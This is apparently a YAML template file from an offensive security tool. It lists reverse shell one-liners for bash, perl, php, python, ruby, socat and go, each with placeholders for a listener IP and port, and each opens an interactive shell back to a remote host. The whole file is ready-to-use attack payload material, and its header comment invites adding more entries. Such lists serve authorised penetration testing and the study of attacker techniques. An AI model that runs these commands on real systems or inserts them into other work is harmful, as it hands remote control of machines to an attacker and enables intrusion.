# Edit or add reverse shell scripts with template :
# - name: <reverse shell title>
#   command: <script CLI connecting to the listener>

- name: bash
  command: echo '/bin/bash -i >& /dev/tcp/%s/%s 0>&1' > a.sh && /bin/bash a.sh

- name: perl
  command: perl -e 'use Socket;$i="%s";$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

- name: php
  command: php -r '$sock=fsockopen("%s",%s);exec("/bin/sh -i <&3 >&3 2>&3");'

- name: python
  command: python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("%s",%s));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'

- name: ruby
  command: |
    ruby -rsocket -e'exit if fork;c=TCPSocket.new("%s","%s");loop{c.gets.chomp!;(exit! if $_=="exit");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts "failed: #{$_}"}'

- name: socat
  command: socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:%s:%s

- name: go
  command: echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","%s:%s");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
